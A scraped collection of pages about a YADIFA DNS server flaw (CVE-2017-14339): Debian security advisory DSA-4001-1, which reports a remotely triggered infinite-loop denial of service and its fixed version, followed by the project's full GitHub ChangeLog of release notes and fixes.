[Política de privacidad](https://www.tarlogic.com/es/politica-de-privacidad/) - [Aviso legal](https://www.tarlogic.com/es/aviso-legal/) - [Política de gestión](https://www.tarlogic.com/es/politica-de-gestion/) - [Política de cookies](https://www.tarlogic.com/es/politica-de-cookies/) - [Canal de denuncias](https://tarlogic-security.factorialhr.es/complaints)

Utilizamos cookies para ofrecerte la mejor experiencia en nuestra web. Puedes aprender más sobre qué cookies utilizamos o desactivarlas en los Ajustes de cookies

Acepto

###### Necesary

Las cookies estrictamente necesarias tiene que activarse siempre para que podamos guardar tus preferencias de ajustes de cookies.

Cookies necesarias
###### Cookies de terceros

Esta web utiliza Google Analytics para recopilar información anónima tal como el número de visitantes del sitio, o las páginas más populares.
Dejar esta cookie activa nos permite mejorar nuestra web.

Cookies de terceros

Activar todo
Guardar ajustes
[Política de cookies](https://www.tarlogic.com/es/politica-de-cookies/)

[Contáctenos ahora 💬](#top)



=== Content from www.debian.org_62b015ab_20250125_183540.html ===


---

[[Date Prev](msg00262.html)][[Date Next](msg00264.html)]
[[Thread Prev](msg00262.html)][[Thread Next](msg00264.html)]
[[Date Index](maillist.html#00263)]
[[Thread Index](threads.html#00263)]

# [SECURITY] [DSA 4001-1] yadifa security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 4001-1] yadifa security update
* *From*: Sebastien Delafond <seb@debian.org>
* *Date*: Thu, 19 Oct 2017 08:31:52 +0000
* *Message-id*: <[[🔎]](/msgid-search/E1e56F6-0005Jx-2Z%40seger.debian.org) [E1e56F6-0005Jx-2Z@seger.debian.org](msg00263.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-4001-1                   security@debian.org
<https://www.debian.org/security/>                       Sebastien Delafond
October 19, 2017                      <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : yadifa
CVE ID         : CVE-2017-14339
Debian Bug     : 876315

It was discovered that YADIFA, an authoritative DNS server, did not
sufficiently check its input. This allowed a remote attacker to cause
a denial-of-service by forcing the daemon to enter an infinite loop.

For the stable distribution (stretch), this problem has been fixed in
version 2.2.3-1+deb9u1.

We recommend that you upgrade your yadifa packages.

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEAqSkbVtrXP4xJMh3EL6Jg/PVnWQFAlnoWekACgkQEL6Jg/PV
nWToCAf/eUz1gX6shKG3BY5l4yRXlE+yBIp7yfldCF5PzCoCOKdiIANuMD+rgvRV
bs349e9NP/FX1dSkqjRYvguPRanrj9aDE2b0XHc2ncDXhtXabl6tHXIkdSSO5HZ5
RvZgOSChxI8Y43HnsSnhAZr9rSBZIzba3COuz35YZIBtv2Sg4RrsWe0MQBKye1cJ
RzX+ibsNz/LLdzR0quq8vzKll0ZSnxL3ON1asGise06gNssmNXrS2Fml6T4/jeZ5
kq7unYaPRTl7kMmvzn9mr+Ve7C6/xrWESHdwIlqCnqxvqRCmtEDKJIF9g2VvhaYJ
R3+Ylp81dKJIV0BovSYukGTFvN2b9g==
=63OJ
-----END PGP SIGNATURE-----

```

---



=== Content from github.com_236a0055_20250125_183540.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyadifa%2Fyadifa%2Fblob%2Fv2.2.6%2FChangeLog)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyadifa%2Fyadifa%2Fblob%2Fv2.2.6%2FChangeLog)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=yadifa%2Fyadifa)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[yadifa](/yadifa)
/
**[yadifa](/yadifa/yadifa)**
Public

* [Notifications](/login?return_to=%2Fyadifa%2Fyadifa) You must be signed in to change notification settings
* [Fork
  13](/login?return_to=%2Fyadifa%2Fyadifa)
* [Star
   71](/login?return_to=%2Fyadifa%2Fyadifa)

* [Code](/yadifa/yadifa/tree/v2.2.6)
* [Issues
  6](/yadifa/yadifa/issues)
* [Pull requests
  1](/yadifa/yadifa/pulls)
* [Actions](/yadifa/yadifa/actions)
* [Projects
  0](/yadifa/yadifa/projects)
* [Security](/yadifa/yadifa/security)
* [Insights](/yadifa/yadifa/pulse)

Additional navigation options

* [Code](/yadifa/yadifa/tree/v2.2.6)
* [Issues](/yadifa/yadifa/issues)
* [Pull requests](/yadifa/yadifa/pulls)
* [Actions](/yadifa/yadifa/actions)
* [Projects](/yadifa/yadifa/projects)
* [Security](/yadifa/yadifa/security)
* [Insights](/yadifa/yadifa/pulse)

## Files

 v2.2.6
## Breadcrumbs

1. [yadifa](/yadifa/yadifa/tree/v2.2.6)
/
# ChangeLog

Copy path Blame  Blame
## Latest commit

## History

[History](/yadifa/yadifa/commits/v2.2.6/ChangeLog)696 lines (524 loc) · 27.1 KB v2.2.6
## Breadcrumbs

1. [yadifa](/yadifa/yadifa/tree/v2.2.6)
/
# ChangeLog

Top
## File metadata and controls

* Code
* Blame

696 lines (524 loc) · 27.1 KB[Raw](https://github.com/yadifa/yadifa/raw/refs/tags/v2.2.6/ChangeLog)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695################################################################################# # Copyright (c) 2011-2017, EURid. All rights reserved.# The YADIFA TM software product is provided under the BSD 3-clause license:# # Redistribution and use in source and binary forms, with or without # modification, are permitted provided that the following conditions# are met:# # \* Redistributions of source code must retain the above copyright # notice, this list of conditions and the following disclaimer.# \* Redistributions in binary form must reproduce the above copyright # notice, this list of conditions and the following disclaimer in the # documentation and/or other materials provided with the distribution.# \* Neither the name of EURid nor the names of its contributors may be # used to endorse or promote products derived from this software # without specific prior written permission.# # THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE # IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE # FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL # DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR # SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.# ################################################################################
20170912: YADIFA 2.2.6 Fixes an issue where a maliciously crafted message may block the server.
20170420: YADIFA 2.2.5 Fixes an issue on message-enabled servers where the return address would not be captured Increased the maximum number of network interfaces to 256
20170406: YADIFA 2.2.4 Fixes an issue with relative include names that would not always be properly computed Fixes an issue where concurrent configuration reloads could lead to a crash 20161215: YADIFA 2.2.3 Removed code triggering an ICE on ppc64le Fixes an issue with the policies where the key size would not be matched Fixes an issue with the generation of RSA keys that would be rejected by the policies Included patches from the community about typos and gcc ICE on ppc64le.
20161108: YADIFA 2.2.2 OpenSSL 1.1.0 crypto API support
20160719: YADIFA 2.2.1
 Multi-master support: Added axfr-retry-failure-delay-multiplier and axfr-retry-failure-delay-max <main> parameters to increase the time between two AXFR/IXFR retries on a master.
 Fixes: - fixed an issue that would crash a YADIFA slave when restarting with a journal present - fixed an issue in AXFR/IXFR retry timing management
20160715: YADIFA 2.2.0  Multi-master support:
 In <zone>, the masters field is now a list. When the master fails to answer, it is moved to the end of the list and (new) first one is used instead.
 There is a true-multimaster setting, defaulted to 'no'. In true multimaster mode, changing the master implies dropping local zone data and ignore serial values. This is to be used for a setup with truly independent masters.
 By default, the master change occurs at first failure. This can be changed to a higher value with multimaster-retries (maximum: 255) This mostly makes sense on true-multimaster mode as you want to be sure before reloading a zone completely.
 Smart signing:
 Keys with smart signing information are now handled by YADIFA.
 DNSSEC policies:
 YADIFA generates an rolls your keys and makes a non-DNSSEC zone into an NSEC or NSEC3 one.
 Support for ECDSA algorithm.
 Better support for huge incremental changes of a zone: YADIFA used to do the modification in one go, which could make it unresponsive for very big changes. Now the changes are applied more slowly, allowing queries to be answered.
 New network model: A new network model can be enabled. This model's main purpose is to be more resistent to system stalls with minimal, if any, performance loss.
 <main> network-model 1
 NSEC3 management improved. Several improvements have been made on the way NSEC3 is handlded. Chains partially covering the zone are now accepted.
 Fixes: - fixed an issue where the maximum pid value supported was 99999 - fixed an issue with RRSIG TTL values that were not always at the expected value. - fixed an issue with the $TTL not being respected.
20160126: YADIFA 2.1.6
 Fixes: - fixed an issue where the referral would not be measured for UDP on a optimised build.
20160108: YADIFA 2.1.5
 Dynamic updates do not use temporary files anymore which improves their general performance. The statistics now shows the referrals.
 Fixes: - fixed an issue where getting a huge incremental transfer would prevent the server from answering queries while applying the changes. - fixed an issue serving IXFR that would occur when a incremental change step was bigger than 64KB - fixed an issue for Solaris with the memory alignment fix not active everywhere - fixed an issue on the Solaris build settings - fixed an issue where sometimes yadifad would not find a configuration file given as a parameter with a relative path - fixed an issue where a wild-card would not be properly returned with an AXFR - fixed an issue where dynamically updating a zone at a speed such that the zone file would need to be written multiple times on disk before finishing the previous write could lead to a deadlock
20151026: YADIFA 2.1.4
 The zone reader error reporting has been improved. Stacktrace support added for Solaris.
 Known issue: - Adding and or removing NSEC3PARAM dynamically is not properly handled.
 Fixes: - fixed an issue where an NSEC3 answer proving a \* query would lead to a crash - fixed an issue where a private key may be not recognised as such - fixed an issue where dynamic update prerequisite check would fail a valid match - fixed an issue where zone signature maintenance would only start if all private keys were available.
20150821: YADIFA 2.1.3
 Fixes: - fixed an issue that could lead to a crash at startup - fixed an issue where parsing a TYPE#### record would stop the parser prematurely
20150814: YADIFA 2.1.2
 The ./configure script has a new option: --enable-full-ascii7 This changes the behaviour of DNS name validation to accept all the ASCII7 characters instead of only the DNS-space ones. Enabling this option is not recommended.
 Fixes: - fixes an issue where the hmac-shaX identification string sent with a TSIG had the suffix ".sig-alg.reg.int".
20150714: YADIFA 2.1.1
 The yadifa command line has a new option: --config|-c file : read the specific configuration file instead of ~/.yadifa.rc
 Issues detected on the NSEC3 database have now been upgraded from debug to info/warning
 Fixes: - fixed an issue where, on some cases; the garbage collector for the zones was not triggering for a long time. - fixed an issue in the Makefile (courtesy of DENIC) - fixed an issue where a few bytes could be leaked in some rare cases when failing to unload a zone - fixed an issue in RRL where some values of IPv6 prefix - fixed an issue accepting some answers on IXFR transfers
20150424: YADIFA 2.1.0
 New journal file format:  This new format addresses a few issues like having maximum journal file and a relatively constant random access time even for very big sizes.
 The internal messaging queue has been changed to address huge amount of zones.
 New CHaos queries supported: hostname id.server
 Known issues: \_ building successfully with LTO may require to append both AR=gcc-ar and RANLIB=gcc-ranlib to the ./configure command
20150403: YADIFA 2.0.6
 This release is a public release. This minor update's sole purpose is to fix YADIFA builds on OpenBSD.
 Fixes: - fixed a crash that could occur while sending a massive amount of notifications - OpenBSD builds are fixed. Tested on: OpenBSD 5.6 amd64, standard installation. Configure: ./configure
 Tested on: OpenBSD 5.6 amd64, with gcc 4.9 installed. Configure: ./configure CC=egcc
20150226: YADIFA 2.0.5
 This release is a public release.
 Fixes: - fixed an issue with huge IXFR transfers as a master - fixed an issue with notifications on slave-slave-master setup - fixed an issue with a potential infinite loop loading an AXFR from a master - fixed missing hmac-sha\* from <key> configuration - fixed an issue with TLSA records parsing - fixed an issue with base 16 encoding - fixed an issue parsing \* domains - fixed an issue with some RRL motivated answers - increased the maximum number of network interfaces from 5 to 16 - fixed an error in the configuration examples where "statistics" was used instead of "stats" - minor fixes and improvements
20141216: YADIFA 2.0.4
 This release is a public release.
 By popular demand, the default log file directory is now PREFIX/var/log/yadifa. It can be set using --with-logdir=/my/dir
 Improved build mechanism. It has been tested to work automatically on Linux, FreeBSD, OSX, SunOS. RedHat family builds will use -O2 as maximum optimisations.
 Note that some optional features are now enabled by default but can be disabled.
 Fixes: - fixed an issue with the AXFR transfer where the serial number would not be properly taken into account - fixed an issue with the notify mechanism that could occur if the server was only listening to 127.0.0.1  - fixed an issue with bogus DNSKEY records that may potentially lead to a crash in openssl - fixed a reported potential "tmpfile" vulnerability on DEBUG builds (generated with make debug) - fixed an issue with IPv6 connections on some architectures - typos fixes - minor fixes and improvements
20141104: Architecture portability enhancements.
 On Solaris, if no --enable-force32bits nor --enable-force64bits is set, then 64 bits will be forced (fixes an issue at link-time)
 ELF 64-bit MSB executable SPARCV9 Version 1, UltraSPARC3 Extensions Required, dynamically linked, not stripped, no debugging information available
 PATH=/opt/csw/bin:/usr/ccs/bin:$PATH ./configure --enable-force32bits PATH=/opt/csw/bin:/usr/ccs/bin:$PATH make
20141030: Architecture portability enhancements.
 FreeBSD 9 FreeBSD dnode3 9.0-RELEASE-p3 FreeBSD 9.0-RELEASE-p3 #0: Tue Jun 12 02:52:29 UTC 2012 root@amd64-builder.daemonology.net:/usr/obj/usr/src/sys/GENERIC amd64 gcc (GCC) 4.2.1 20070831 patched [FreeBSD] ELF 64-bit LSB executable, x86-64, version 1 (FreeBSD), dynamically linked (uses shared libs), for FreeBSD 9.0 (900044), not stripped
 Ubuntu Linux dnode10 3.2.0-49-generic #75-Ubuntu SMP Tue Jun 18 17:39:32 UTC 2013 x86\_64 x86\_64 x86\_64 GNU/Linux gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3 ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xe3b8601b9b5e59f8c9ce519cacbe9b8ff544ff1d, not stripped
 OSX Darwin RD-Mac-Mini.local 13.3.0 Darwin Kernel Version 13.3.0: Tue Jun 3 21:27:35 PDT 2014; root:xnu-2422.110.17~1/RELEASE\_X86\_64 x86\_64 Apple LLVM version 5.1 (clang-503.0.40) (based on LLVM 3.4svn) Mach-O 64-bit executable x86\_64
20141029: Architecture portability enhancements.
 uname -a gcc --version file yadifad
 YellowDog Linux Linux 2.6.29-3.ydl61.4 #1 SMP Mon Sep 7 14:50:27 PDT 2009 ppc64 ppc64 ppc64 GNU/Linux gcc (GCC) 4.1.2 20080704 (Red Hat 4.1.2-44) ELF 32-bit MSB executable, PowerPC or cisco 4500, version 1 (SYSV), for GNU/Linux 2.6.9, dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
 note: using --enable-force64bits failed because of ssl, no simple/quick way to install openssl-devel.ppc64 seemed available
 Debian PPC64 Linux 3.2.0-3-powerpc64 #1 SMP Mon Jul 23 08:03:56 UTC 2012 ppc64 GNU/Linux gcc (Debian 4.6.3-8) 4.6.3 ELF 32-bit MSB executable, PowerPC or cisco 4500, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xedc47c984a4af7eb9a7ecbc0f135e4d064ba08f0, with unknown capability 0x41000000 = 0x13676e75, with unknown capability 0x10000 = 0xb0401, not stripped
 note: using --enable-force64bits failed because of ssl, no simple/quick way to install openssl-devel.ppc64 seemed available
20141016: YADIFA 2.0.2
 TCP fallback support on truncation
20140905: YADIFA 2.0.0
 This release is a public release
 Fixes: - fixed a log incorrectly reporting an error when the client didn't close the TCP connection fast enough - fixed an issue with the statistics on TCP queries
 Known issue: - removing the last key of a signed zone is permitted by YADIFA but triggers some chicken-egg issue with signatures.
20140829: YADIFA 2.0.0-beta3-public
 This release is a public release
 - --disable-master feature at configure now builds a slave-only server
 Fixes: - fixed an issue with TSIG signed queries - fixed an issue with thread pool live resizing - fixed an issue where reading an undeleted obsolete journal ending at the start of a newly transferred zone from the master would incorrectly trigger an error
 Known issue: - removing the last key of a signed zone is permitted by YADIFA but triggers some chicken-egg issue with signatures.
20140630: YADIFA 2.0.0-beta2-public
 This release is a public release
 - basepath disabled - pidpath removed, only pidfile remains - log reopen notification is now timestamped - slave zones no longer complain about missing NSEC/NSEC3 private keys - the error code ZRE\_FILE\_NOT\_FOUND has been replaced by the more accurate code ZRE\_NO\_VALID\_FILE\_FOUND - default logging settings no longer output debug
 Fixes: - fixed issue in flag computation (AD,CD) - fixed an issue with journal truncation sometimes leading to a crash - zone parsing now correctly accepts '#' as a comment marker - zone parsing now rejects wrong fqdn as soon as it reads them, leading to a more accurate error message - removing the last dnskey of a zone no longer crashes the server
 Known issue: - removing the last key of a signed zone is permitted by YADIFA but triggers some chicken-egg issue with signatures.
 yadifa remote client commands prototype is now available with the following supported commands:
 -shutdown shuts down yadifa e.g. ./yadifa -s "192.0.2.1 port 53" -t shutdown  -cfgreload reloads the <key> and <zone> sections of the yadifad configuration
 e.g. ./yadifa -s "192.0.2.1 port 53" -t cfgreload
 -logreopen closes and reopen the log files
 e.g. ./yadifa -s "192.0.2.1 port 53" -t logreopen
 -freezeall prevents all zones from being updated dynamically with nsupdate  e.g. ./yadifa -s "192.0.2.1 port 53" -t freezeall
 -freeze prevents a zone from being updated dynamically with nsupdate
 e.g. ./yadifa -s "192.0.2.1 port 53" -t freeze -q somedomain.eu
 -unfreezeall enables updates of all zones again
 e.g. ./yadifa -s "192.0.2.1 port 53" -t unfreezeall
 -unfreeze enables updates of a zone again
 e.g. ./yadifa -s "192.0.2.1 port 53" -t unfreeze -q somedomain.eu
 In order to work, the allow-control ACL must be defined either in <main> for the global commands and may also be defined in <zone> for the ones targeting a specific zone.
 e.g. allow-control 127.0.0.1
 Note that tsig is not supported in the client yet.
20140528: YADIFA 2.0.0-beta1-public
 This release is a public release
 - NSID implemented (enabled at ./configure time with --enable-nsid - generic parser for: - getops - zone file - resolv.conf - configuration - '@' can now be used in a zone file - new binary for controlling 'yadifad' (yadifa) - framework is rewritten for multi core systems - single core server has been removed
 Fixes:  - fixed several minor issues
 Know issues: - removing all dnskeys from a zone file crashes the server - yadifa has some issues with nodelay, nocork 20130424: YADIFA 1.1.0 \_ added DSA signature \_ added SHA-256 SHA-384 SHA-512 digest algorithms \_ now supports additional DNSSEC algorithms: DSASHA1 DSASHA1\_NSEC3 RSASHA256\_NSEC3 RSASHA512\_NSEC3 \_ Respone Rate Limitation implemented (enabled at ./configure time with --enable-rrl) \_ --enable-tiny-footprint now reduces the memory usage further by reducing the standard log queue from 2^20 to 2^12 entries \_ the general speed has been slightly improved \_ dynamic updates pending for more than 3 seconds are now dropped with an error \_ dynamic provisioning Fixes: \_ fixed a memory leak that could occur at NSEC3 generation when loading the zone failed in a particular way \_ fixed a memory leak at ixfr send \_ fixed handling of '\_' character that was improperly stored in the database \_ fixed bandwidth limit settings (tcp stream in and out) not always being taken from the configuration \_ fixed TSIG answer verification for notifies \_ fixed error codes not being registered and thus logged as unknown hexadecimal error code. \_ other minor fixes
20130612: YADIFA 1.0.3 Fixes only (backports from 1.1.0)
 Fixes: \_ fixed an issue preventing YADIFA from being build from another directory \_ fixed an issue with OSX systems where gsed has to be used instead of sed \_ fixed an issue with the '\_' character not being properly handled \_ fixed an issue where reading MX record from a zone file would incorrecly be rejected as invalid \_ fixed an issue where the OPT record would not be properly written \_ fixed an issue where an undefined ACL reference would be silently ignored \_ fixed missing code tags for several error codes. From now on unregistered codes are dumped in hexadicimal. \_ fixed portability issues with BSD and OSX \_ fixed several minor issues
20120921: YADIFA 1.0.2 Fixes only
 Fixes: \_ fixed an issue where the journal file was sometimes not properly closed at the end of a task \_ fixed an issue where the TCP usage slots would sometimes wrongly return that they were all being used \_ fixed an issue on IXFR processing (slave side) where the type of answer from the master would not be properly detected \_ fixed an issue with TSIG on secrets not exactly 16 bytes long (binary form) \_ fixed an issue on 32 bits architectures where the sig-validity-\* fields would not be properly handled if not set on each zone section. \_ slightly improved the replay time of big journal files \_ fixed several minor issues
 Known issues: \_ if the serial of a zone is changed in a way that it goes beyond a value such as the journal serial start is bigger than the journal serial end, issues are expected for IXFR answers. \_ notify is ignored on TCP
20120709: YADIFA 1.0.1 \_ logging repeat compression is now by channel instead of global
 Fixes: \_ fixed an issue where glibc whould assert if libgcc\_s.so (libgcc\_s.so.1) and libc.so (libc.so.6) where not available inside the chrooted directory of YADIFA \_ fixed an issue in the syslog module
 Known issues: \_ on 32 bits architectures, the sig-validity-\* fields are not properly copied from <main> to <zone> as a workaround, set the sig-validity fields in each <zone> container in 32 bits architectures
 ie: sig-validity-interval 7 sig-validity-regeneration 168 sig-validity-jitter 3600 \_ if the serial of a zone is changed in a way that it goes beyond a value such as the journal serial start is bigger than the journal serial end, issues are expected for IXFR answers. \_ notify is ignored on TCP
20120625: YADIFA 1.0.0 \_ LTO support can be enabled with --enable-lto but this is not working with clang. LTO does not increase the performance significally \_ parallel processing of listening addresses can now be enabled. It can be set using thread-count-by-address in the <main> section. By default YADIFA will not use parallel processing as this feature has not been as thoroughly tested as the single-thread processing model \_ default parameters tuning \_ fixes
 Known issue: \_ on 32 bits architectures, the sig-validity-\* fields are not properly copied from <main> to <zone> as a workaround, set the sig-validity fields in each <zone> container in 32 bits architectures
 ie: sig-validity-interval 7 sig-validity-regeneration 168 sig-validity-jitter 3600 20120530: YADIFA 1.0.0RC3 \_ the configuration parser now ignores undefined logger names and report them with a warning \_ syslog messages are now put in the name of "yadifad" instead of the name used for the "syslog" channel \_ syslog messages do not print the time from YADIFA anymore \_ improved the steps involved in loading a locally cached slave zone \_ zones are now loaded in background  \_ man page yadifad-conf.man5 renamed into yadifad.conf.man5
 Fixes: \_ AXFR/IXFR answers with the RA bit set are nolonger rejected as invalid \_ YADIFA now answers to SIGINT again (shutdown) \_ fixed an issue where obsolete AXFR files were not always being deleted \_ fixed an issue occurring when both IPv4 and IPv6 were available to handle a notify \_ fixed journal replay issue where some RRSIGs records were not properly removed \_ fixed an issue occurring with IPv6 queries \_ fixed an issue in the generation of a specific NSEC3 error answer \_ fixed named query style layout
 Known issue: \_ if the serial of a zone is changed in a way that it goes beyond a value such as the journal serial start is bigger than the journal serial end, issues are expected for IXFR answers. \_ notify is ignored on TCP 20120328: YADIFA 1.0.0RC2 \_ fixed logging issue on work file creation error \_ fixed an issue where IXFR queries could be rejected as being wrongly formatted \_ fixed an issue in the query logging text \_ enabled command line options ( -u uid -g gid -d ) 20120319: YADIFA 1.0.0RC1
 Is a full functional authoritative name server:
 - works as primary or secondary name server - AXFR - IXFR - NOTIFY - NSUPDATE - TSIG - CLASSES: - IN - CH (just for version) - TYPES: - AAAA - CNAME - DNSKEY - DS - HINFO - MX - NAPTR - NS - NSEC3 - NSEC3PARAM - NSEC - PTR - RRSIG - SOA - SRV - SSHFP - TXT - Automatic resigning - DNSSEC algorithms: - 5 (RSASHA1) - 7 (RSASHA1-NSEC3 - ACL's
 KNOWN ISSUES:
 NSEC3: \_ cannot work with multiple NSEC3PARAM chains with mixed OPT-IN/OUT settings
 \_ adding a new NSEC3 chain expects that the master sends the NSEC3PARAM first (it does not seems to be always the case) We have a case where a master starts with 2 thousands NSEC3 opt-out records then adds 6 millions NSEC3 opt-in records but does not give the NSEC3PARAM record first. The slave server rejects them all because it's unable to link them to a chain. (This one has high priority)
 DNSSEC: \_ it is not allowed to change the zone security mode (unsecure, NSEC, or NSEC3). Once the zone is loaded it keeps its security mode.
 \_ dynamic updates of NSEC as well as NSEC3 records are refused
 QUIT: the server will shutdown on the following conditions:
 \_ detection of an impossible situation or an internal integrity issue (ie: for any reason the SOA has vanished from a zone)
 \_ memory limit reached which prevents any more work
 \_ ipc issue which prevent internal services communication
 ACL: \_ since the access control is set by zone and CHAOS class is not implemented as a configurable zone, it is not possible (yet) to specifically block CHAOS queries.
20111121: YADIFA 0.5.5 - many fixes
 KNOWN ISSUE: NSEC3 slave zone replay fails.
20110706: YADIFA 0.5.0 - slave mode, AXFR/IXFR (no TSIG yet for the slave-side transfer) - answers to a notify from the master - polls the (first) master on the masters list - maintains the .axfr & .ix files (deletes the obsoletes ones) - TSIG queries are checked - Replays the zone journal on startup after the zone load (journaling) - Answers IXFR queries (journaling)
20110601: YADIFA 0.4.0 Operational: - It works as a no dnssec name server - No notifies to slave name servers - daemon - Answers AXFR queries with TSIG - nsupdate functionality (journaling) - TSIG on client server side will be transmitted, but not checked - ACL works - The zone has SOA, NS A resource records.
20110524: YADIFA 0.3.0 First release internally of yadifad 20110524115500 GMT+1.
 Operational: - It works as a no dnssec name server - No notifies to slave name servers - daemon - Answers AXFR queries - The zone has SOA, NS A resource records.
20091224: YADIFA 0.2.0 \_ Answers AXFR queries \_ ACL based on IP and TSIG (not all query types are ACL'ed yet)
20091104: YADIFA 0.1.0
 YADIFA is a work in progress. The main goal is to have an alternative for BIND or NSD.
 Version 0.1.0 is an authoritative server only.
 It has no: - AXFR/IXFR functionality - dynupdate - support for NSEC - support for NSEC3 - caching mechanism - additional tools (eg.dig, dnssectools, drill,...)
 It has: - a very fast way to give authoritative answer - a very fast method for loading the database and checking the zone files
 This first release is to have a feeling how it works in an operational environment.  TODO
 Everything what is not implemented, has to be implemented. Most of the code is there, but is not activated.
 No comformity tests has been done. (This of course is on the todo list)
Bug Reports and Mailing Lists
 Bugs reports should be sent to
 bugreport@yadifa.eu

## Footer

© 2025 GitHub, Inc.

